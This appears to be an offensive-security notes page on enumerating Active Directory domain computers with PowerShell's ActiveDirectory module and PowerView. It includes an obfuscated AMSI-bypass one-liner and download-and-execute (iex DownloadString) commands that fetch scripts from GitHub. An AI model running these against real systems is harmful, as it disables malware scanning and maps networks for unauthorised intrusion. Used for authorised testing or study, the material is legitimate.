---
title: "Domain Computers"
description: "Enumerating domain computers."
lead: "Enumerating information about domain computers using the ActiveDirectory PowerShell module and PowerView."
date: 2021-11-07T18:02:53+01:00
lastmod: 2021-11-07T18:02:53+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "domain_enumeration"
weight: 20
toc: true
---

## ActiveDirectory Module

### Setup

```powershell
# If computer has internet access
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory

# If computer has no internet access, download repository
Import-Module .\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose
Import-Module .\ADModule\ActiveDirectory\ActiveDirectory.psd1

# Check if module has been imported correctly
Get-Command -Module ActiveDirectory
```

### Commands

```powershell
# Get list of computers in current domain
Get-ADComputer -Filter * -Properties *
Get-ADComputer -Filter * | Select Name

# Information about operating systems
Get-ADComputer -Filter 'OperatingSystem -Like "*Server 2016"' -Properties OperatingSystem | Select Name,OperatingSystem

# Check for live hosts (depends on ICMP)
Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}
```

## PowerView

### Setup

```powershell
# If it gets blocked by AMSI we can bypass it with
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# Then load the module
Import-Module .\PowerView.ps1
. .\PowerView.ps1

# With internet access
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')
```

### Commands

```powershell
# Get list of computers in current domain
Get-NetComputer
Get-NetComputer -FullData

# Check for live hosts (depends on ICMP)
Get-NetComputer -Ping

# Information about operating systems
Get-NetComputer -OperatingSystem "*Server 2016"
Get-NetComputer -FullData | select dnshostname,operatingsystem

# Get list of sessions on computer
Get-NetSession -ComputerName "dc01.lab.local"

# Find any computers with constrained delegation set
Get-DomainComputer -TrustedToAuth

# Find all servers that allow unconstrained delegation
Get-DomainComputer -Unconstrained

# Return the local *groups* of a remote server
Get-NetLocalGroup SERVER.domain.local

# Return the local group *members* of a remote server using Win32 API methods (faster but less info)
Get-NetLocalGroupMember -Method API -ComputerName SERVER.domain.local

# enumerates computers in the current domain with 'outlier' properties, i.e. properties not set from the firest result returned by Get-DomainComputer
Get-DomainComputer -FindOne | Find-DomainObjectPropertyOutlier
```
